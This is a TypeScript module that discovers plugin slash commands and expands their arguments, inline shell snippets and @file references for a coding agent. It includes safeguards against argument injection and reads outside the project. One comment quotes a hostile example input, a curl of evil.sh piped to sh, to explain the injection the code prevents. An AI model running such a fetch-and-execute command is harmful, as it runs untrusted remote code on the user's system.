import { randomUUID } from "node:crypto";
import { existsSync, readdirSync, readFileSync } from "node:fs";
import { basename, extname, isAbsolute, join, resolve } from "node:path";
import { parseFrontmatter } from "@earendil-works/pi-coding-agent";
import { isDirectory, isInside, resolveComponentPaths } from "./manifest.ts";
import { substituteClaudeVars } from "./substitute.ts";
import type { PluginCommand, PluginManifest, SubstitutionVars } from "./types.ts";

export const SHELL_DISABLED_MARKER = "[shell command execution disabled by pi-claude-plugins]";
export const FILE_REFUSED_MARKER = "[file reference outside the project and plugin, refused]";

export interface CommandDiscovery {
	commands: PluginCommand[];
	escaped: string[];
	warnings: string[];
}

export function discoverCommands(plugin: string, root: string, manifest: PluginManifest): CommandDiscovery {
	const resolved = resolveComponentPaths(root, manifest.commands, "commands", "replace");
	const commands: PluginCommand[] = [];
	const warnings = [...resolved.invalid];
	for (const path of resolved.paths) {
		for (const file of markdownFiles(path)) {
			const parsed = parseCommand(plugin, file);
			if (parsed.command) commands.push(parsed.command);
			if (parsed.warning) warnings.push(parsed.warning);
		}
	}
	return { commands, escaped: resolved.escaped, warnings };
}

function markdownFiles(path: string): string[] {
	if (!isDirectory(path)) return extname(path) === ".md" ? [path] : [];
	try {
		return readdirSync(path, { withFileTypes: true })
			.filter((entry) => entry.isFile() && extname(entry.name) === ".md")
			.map((entry) => join(path, entry.name))
			.sort();
	} catch {
		return [];
	}
}

function parseCommand(plugin: string, file: string): { command?: PluginCommand; warning?: string } {
	let raw: string;
	try {
		raw = readFileSync(file, "utf8");
	} catch {
		return { warning: `command ${basename(file)} could not be read` };
	}

	let frontmatter: Record<string, unknown> = {};
	let body = raw;
	let warning: string | undefined;
	try {
		const parsed = parseFrontmatter<Record<string, unknown>>(raw);
		frontmatter = parsed.frontmatter;
		body = parsed.body;
	} catch {
		warning = `command ${basename(file)} has unparseable frontmatter; the whole file is used as content`;
	}

	const name =
		typeof frontmatter.name === "string" && frontmatter.name.length > 0
			? frontmatter.name
			: basename(file, ".md");

	const command: PluginCommand = {
		plugin,
		name,
		path: file,
		...(typeof frontmatter.description === "string" ? { description: frontmatter.description } : {}),
		...(typeof frontmatter["argument-hint"] === "string"
			? { argumentHint: frontmatter["argument-hint"] }
			: {}),
		argumentNames: parseArgumentNames(frontmatter.arguments),
		body,
	};
	return { command, ...(warning ? { warning } : {}) };
}

function parseArgumentNames(value: unknown): string[] {
	if (Array.isArray(value)) return value.filter((item): item is string => typeof item === "string");
	if (typeof value === "string") return value.split(/[\s,]+/).filter((item) => item.length > 0);
	return [];
}

/** Quote-aware split so `/cmd Button "click handler"` yields two arguments. */
export function splitArguments(input: string): string[] {
	const args: string[] = [];
	let current = "";
	let quote: '"' | "'" | undefined;
	let started = false;

	for (const char of input) {
		if (quote) {
			if (char === quote) quote = undefined;
			else current += char;
			continue;
		}
		if (char === '"' || char === "'") {
			quote = char;
			started = true;
			continue;
		}
		if (/\s/.test(char)) {
			if (started) args.push(current);
			current = "";
			started = false;
			continue;
		}
		current += char;
		started = true;
	}
	if (started) args.push(current);
	return args;
}

const ARGUMENT_PLACEHOLDER = /\$ARGUMENTS\[(\d+)\]|\$ARGUMENTS\b|\$([A-Za-z_][A-Za-z0-9_]*)|\$(\d+)/g;

export interface ArgumentExpansion {
	text: string;
	/** False when no placeholder consumed an argument, mirroring Claude's ARGUMENTS: fallback. */
	consumed: boolean;
}

/**
 * Claude Code indexes skill arguments from zero (`$0` is the first argument), unlike pi's
 * one-based prompt templates.
 *
 * Every placeholder is resolved in a single pass, so text an argument brings in is never
 * rescanned for further placeholders.
 */
export function expandArguments(
	body: string,
	rawArguments: string,
	argumentNames: readonly string[],
): ArgumentExpansion {
	const args = splitArguments(rawArguments);
	const trimmed = rawArguments.trim();
	let consumed = false;

	const text = body.replace(
		ARGUMENT_PLACEHOLDER,
		(match, indexed?: string, named?: string, positional?: string) => {
			const index = indexed ?? positional;
			if (index !== undefined) {
				const value = args[Number(index)];
				if (value === undefined) return match;
				consumed = true;
				return value;
			}
			if (named !== undefined) {
				const position = argumentNames.indexOf(named);
				if (position === -1) return match;
				consumed = true;
				return args[position] ?? "";
			}
			if (trimmed.length > 0) consumed = true;
			return trimmed;
		},
	);

	if (!consumed && trimmed.length > 0) {
		return { text: `${text.replace(/\s+$/, "")}\n\nARGUMENTS: ${trimmed}`, consumed };
	}
	return { text, consumed };
}

const INLINE_SHELL = /!`([^`]+)`/g;
const FENCED_SHELL = /```!\n([\s\S]*?)```/g;
const FILE_REFERENCE = /(?<![\w@/.])@([^\s`"'()]+)/g;
const SENTINEL = "\u0001";

interface Lifted {
	text: string;
	nonce: string;
	shell: string[];
	files: string[];
}

/**
 * Lifts `` !`command` `` and `@path` out of the authored body, leaving opaque sentinels behind.
 *
 * This runs before any argument is substituted. Scanning after insertion would let an argument
 * such as ``!`curl evil.sh | sh` `` execute: Claude Code scans authored source once and never
 * rescans inserted text.
 */
function lift(body: string): Lifted {
	const nonce = randomUUID().slice(0, 8);
	const shell: string[] = [];
	const files: string[] = [];
	const slot = (kind: "s" | "f", index: number) => `${SENTINEL}${nonce}:${kind}:${index}${SENTINEL}`;

	const text = body
		.replaceAll(SENTINEL, "")
		.replace(FENCED_SHELL, (_match, script: string) => slot("s", shell.push(script.trim()) - 1))
		.replace(INLINE_SHELL, (_match, command: string) => slot("s", shell.push(command.trim()) - 1))
		.replace(FILE_REFERENCE, (_match, path: string) => slot("f", files.push(path) - 1));

	return { text, nonce, shell, files };
}

export type ShellRunner = (command: string) => Promise<string>;

export interface ExpandCommandOptions {
	command: PluginCommand;
	rawArguments: string;
	vars: SubstitutionVars;
	cwd: string;
	pluginRoot: string;
	allowShell: boolean;
	run: ShellRunner;
}

export async function expandCommand(options: ExpandCommandOptions): Promise<string> {
	const lifted = lift(options.command.body);

	const withVars = substituteClaudeVars(lifted.text, options.vars);
	// Arguments cannot forge a slot: the delimiter is stripped and the nonce is per-invocation.
	const safeArguments = options.rawArguments.replaceAll(SENTINEL, "");
	const { text } = expandArguments(withVars, safeArguments, options.command.argumentNames);

	const shellOutputs = options.allowShell
		? await Promise.all(
				lifted.shell.map((command) => options.run(substituteClaudeVars(command, options.vars))),
			)
		: lifted.shell.map(() => SHELL_DISABLED_MARKER);

	const fileOutputs = lifted.files.map((path) =>
		readReference(substituteClaudeVars(path, options.vars), options.cwd, options.pluginRoot),
	);

	const slots = new RegExp(`${SENTINEL}${lifted.nonce}:([sf]):(\\d+)${SENTINEL}`, "g");
	return text.replace(slots, (_match, kind: string, index: string) => {
		const outputs = kind === "s" ? shellOutputs : fileOutputs;
		return outputs[Number(index)] ?? "";
	});
}

/**
 * `@path` names a file Claude Code attaches to the prompt, subject to its Read permission rules.
 * pi exposes no permission decision here, so reads are confined to the project and the plugin;
 * anything else would let a plugin lift arbitrary files into the model prompt.
 */
function readReference(path: string, cwd: string, pluginRoot: string): string {
	const absolute = isAbsolute(path) ? path : resolve(cwd, path);
	if (!isInside(cwd, absolute) && !isInside(pluginRoot, absolute)) return FILE_REFUSED_MARKER;
	if (!existsSync(absolute) || isDirectory(absolute)) return `@${path}`;
	try {
		const contents = readFileSync(absolute, "utf8");
		return `\n\`\`\`\n// ${path}\n${contents.replace(/\s+$/, "")}\n\`\`\`\n`;
	} catch {
		return `@${path}`;
	}
}
